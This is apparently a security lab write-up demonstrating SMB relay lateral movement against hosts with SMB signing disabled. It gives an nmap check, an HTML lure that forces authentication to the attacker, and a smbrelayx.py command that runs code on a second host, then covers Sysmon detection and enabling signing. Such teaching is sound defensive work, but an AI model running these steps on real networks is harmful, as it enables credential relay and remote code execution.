# Lateral Movement via SMB Relaying

## Lateral Movement via SMB Relaying

This lab looks at a lateral movement technique abusing SMB protocol if SMB signing is disabled.

SMB signing is a security mechanism that allows digitally signing SMB packets to enforce their authenticity and integrity - the client/server knows that the incoming SMB packets they are receiving are coming from a trusted source and that they have not been tampered with while in transit, preventing man in the middle type attacks.

If SMB signing is disabled, howeverm packets can be intercepted/modified and/or relayed to another system, which is what this lab is about.

### Environment

* 10.0.0.5 - attacker running Kali linux and smb relaying tool
* 10.0.0.2 - victim1; their credentials will be relayed to victim2
* 10.0.0.6 - victim2; code runs on victim2 with victim1 credentials

{% hint style="warning" %}
Credentials from Victim1 must be for a local admin on Victim2 or be a member of Administrators/Domain Administrators group for this attack to work successfully.
{% endhint %}

Below is a simplified process of how this attack works:

`10.0.0.2` -authenticates to-> `10.0.0.5` -relays to-> `10.0.0.6` executes code with victim1(10.0.0.2) credentials

### Execution

One of the ways to check if SMB signing is `disabled` on an endpoint:

{% code title="attacker\@kali" %}
```csharp
nmap -p 445 10.0.0.6 -sS --script smb-security-mode.nse
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LV2pfEJWGgsZvA7lcyq%2F-LV2rbdfohiQhgVVp36v%2FScreenshot%20from%202018-12-31%2010-45-27.png?alt=media\&token=452ebf26-f21f-49e2-8316-abd160f3d4c0)

Since we know that victim2@10.0.0.6 has SMB signing disabled and is vulnerable to SMB relaying attack, let's create a simple HTML file that once opened will force the victim1 to authenticate to attacker's machine:

{% code title="message.html" %}
```markup
<html>
    <h1>holla good sir</h1>
    <img src="file://10.0.0.5/download.jpg">
</html>
```
{% endcode %}

{% hint style="info" %}
Any other forced authentication method will also work - follow below link for a list of techniques.
{% endhint %}

...at the same time, let's fire up SMBRelayx tool that will listen for incoming SMB authentication requests and will relay them to victim2@10.0.0.6 and will attempt to execute a command `ipconfig`on the end host:

{% code title="attacker\@kali" %}
```
smbrelayx.py -h 10.0.0.6 -c "ipconfig"
```
{% endcode %}

{% hint style="info" %}
Note that smbrelayx could be used with a `-e` switch that allows attacker to execute their payload file - say, a meterpreter executable.
{% endhint %}

Below is a gif showing the technique in action - on the left - `victim1@10.0.0.2` opening the malicious html we crafted earlier that forces it to attempt to authenticate to the attacker system (on the right). Once the authentication attempt comes in, it gets relayed to `victim2@10.0.0.6` and ipconfig gets executed:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LV0DjrJzk89gFPZMs9j%2F-LV0FHYzHLQArZq6xa8p%2FPeek%202018-12-30%2022-31.gif?alt=media\&token=a9ae3e7d-e2bc-4283-9cfe-a5f06f6187fa)

A stop frame from the above gif that highlights that the code execution indeed happend on 10.0.0.6:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LV0DjrJzk89gFPZMs9j%2F-LV0FEWFMv0_K8EdnwWC%2FScreenshot%20from%202018-12-30%2022-33-59.png?alt=media\&token=96cfeff4-3c28-49f4-9424-b68cfc174167)

### Observations & Mitigation

Smbrelayx.py leaves a pretty good footprint for defenders in Microsoft-Windows-Sysmon/Operational - the parent image is services.exe and the commandline has juicy details - note though that the commandline arguments are subject to forgery:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LV3QzHkCQqnDpDQaIY8%2F-LV3S66ZH7xU8fHCuMMz%2FScreenshot%20from%202018-12-31%2013-29-13.png?alt=media\&token=ada22efe-550a-4b67-af93-189b18a61bc1)

In order to mitigate this type of attack, the best way to do it is by implementing GPOs if possible by setting the policy **Microsoft network server: Digitally sign communications (always)** to `Enabled`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LV2pfEJWGgsZvA7lcyq%2F-LV2phm3OqrX7_iFMRDn%2FScreenshot%20from%202018-12-31%2010-36-45.png?alt=media\&token=b64239f2-b780-43b9-b081-9689965afc52)

With the above change, trying to execute the same attack, we get `Signature is REQUIRED` errors message and lateral movement is prevented:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LV0DjrJzk89gFPZMs9j%2F-LV0FfwCtpKjz6sYRTCd%2FScreenshot%20from%202018-12-30%2022-36-01.png?alt=media\&token=3f0697e8-7089-4791-b031-ce3220162c96)

The same nmap scan we did earlier now also shows that the `message signing is required`:

{% code title="attacker\@kali" %}
```csharp
nmap -p 445 10.0.0.6 -sS --script smb-security-mode
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LV2pfEJWGgsZvA7lcyq%2F-LV2wJWDB7foo20sG8fO%2FScreenshot%20from%202018-12-31%2011-05-59.png?alt=media\&token=fcb551c7-6b0c-4a4b-8a73-bffd796db1d7)

### References

{% embed url="https://ramnathshenoy.wordpress.com/2017/03/19/lateral-movement-with-smbrelayx-py/" %}

{% embed url="https://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/" %}

{% embed url="https://nmap.org/nsedoc/scripts/smb-security-mode.html" %}
